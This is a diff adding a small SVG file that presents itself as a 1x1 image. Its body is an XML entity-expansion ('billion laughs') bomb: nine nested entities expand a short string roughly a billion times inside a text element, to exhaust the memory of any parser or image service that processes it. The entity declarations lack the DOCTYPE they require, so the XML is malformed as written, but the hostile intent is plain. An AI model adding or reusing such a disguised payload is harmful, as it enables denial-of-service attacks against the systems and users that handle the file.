@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
+<!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;">
+<!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
+<!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
+<!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
+<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
+<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+<!ENTITY a "AAAAAAAAAA">
+<text x="0" y="0">&i;</text>
+</svg>
